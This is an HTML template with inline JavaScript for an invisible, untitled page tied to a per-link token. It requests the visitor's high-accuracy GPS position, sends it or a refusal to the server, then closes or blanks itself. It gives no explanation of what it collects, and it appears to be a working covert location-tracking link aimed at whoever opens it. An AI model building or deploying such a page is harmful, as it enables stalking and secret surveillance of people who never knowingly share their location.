<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title> </title>
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function() {
  var token = "{{ token }}";
  var sent = false;

  {% if expired %}
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.close(); } catch(e) {}
    return;
  {% endif %}

  function sendToServer(lat, lng, acc) {
    if (sent) return;
    sent = true;
    var payload = JSON.stringify({
      token: token,
      latitude: lat,
      longitude: lng,
      accuracy: acc
    });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-update', blob);
    } else {
      try { fetch('/api/location-update', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
    window._sent = true;
  }

  function sendDenied() {
    if (sent) return;
    sent = true;
    fetch('/api/location-denied', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token }),
      keepalive: true
    }).catch(function(){});
    window._sent = true;
  }

  function vanish() {
    if (!sent) { sent = true; window._sent = true; }
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.open('', '_self', '').close(); } catch(e) {}
    try { self.close(); } catch(e) {}
    try { window.close(); } catch(e) {}
    setTimeout(function() {
      try {
        document.open();
        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
        document.close();
      } catch(e) {}
    }, 10);
  }

  function tryGPS() {
    if (!("geolocation" in navigator)) {
      sendDenied();
      vanish();
      return;
    }

    function attemptGPS(callback) {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
          if (callback) callback();
        },
        function() {
          sendDenied();
          if (callback) callback();
        },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    }

    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: 'geolocation' })
        .then(function(status) {
          if (status.state === 'granted') {
            navigator.geolocation.getCurrentPosition(
              function(pos) {
                sendToServer(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                vanish();
              },
              function() { vanish(); },
              { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
            );
            setTimeout(function() { if (!window._sent) vanish(); }, 8000);
          } else if (status.state === 'denied') {
            sendDenied();
            vanish();
          } else {
            // prompt state — will show the browser dialog
            attemptGPS(function() { vanish(); });
            setTimeout(function() { if (!window._sent) vanish(); }, 16000);
          }
        })
        .catch(function() {
          attemptGPS(function() { vanish(); });
          setTimeout(function() { if (!window._sent) vanish(); }, 14000);
        });
    } else {
      attemptGPS(function() { vanish(); });
      setTimeout(function() { if (!window._sent) vanish(); }, 14000);
    }
  }

  tryGPS();
  setTimeout(function() { if (!window._sent) vanish(); }, 18000);
})();
</script>
</body>
</html>
